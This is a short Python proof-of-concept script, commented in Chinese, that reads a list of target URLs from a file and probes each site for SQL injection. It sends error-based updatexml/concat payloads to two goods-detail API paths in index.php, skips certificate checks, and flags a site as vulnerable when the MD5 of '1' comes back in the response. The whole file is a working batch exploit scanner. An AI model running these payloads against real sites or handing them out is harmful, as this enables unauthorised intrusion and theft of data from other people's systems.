# -*- coding:utf-8 -*-
import requests
import re
import json
import sys
import urllib3
 
urllib3.disable_warnings() #忽略https证书告警
 
vunl_path1 = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)"
vunl_path2 = "/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)"


 
def POC(url):
    target_url1 = url + vunl_path1
    target_url2 = url + vunl_path2
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
 
    }
    try:
        response = requests.get(url=target_url1, headers=headers, verify=False, timeout=100)
        print("正在测试：", target_url1)
        if "c4ca4238a0b923820dcc509a6f75849" in response.text:
            print(url+"的ApiController.class.php存在SQL注入")       
        response2 = requests.get(url=target_url2, headers=headers, verify=False, timeout=100)
        print("正在测试：", target_url2)
        if "c4ca4238a0b923820dcc509a6f75849" in response2.text:
            print(url+"的ApigoodController.class.php存在SQL注入")
 
    except Exception as e:
        print(url+"请求失败！")
        sys.exit(0)
 
if __name__ == '__main__':
    
    txtname=input ("please input txt name")
    txt=open(txtname)

    while True:    
            line=txt.readline()
            addr=str(line).rstrip("\n")
            if addr:
                    POC(addr)
            else:
                    break
    txt.close()
        
 
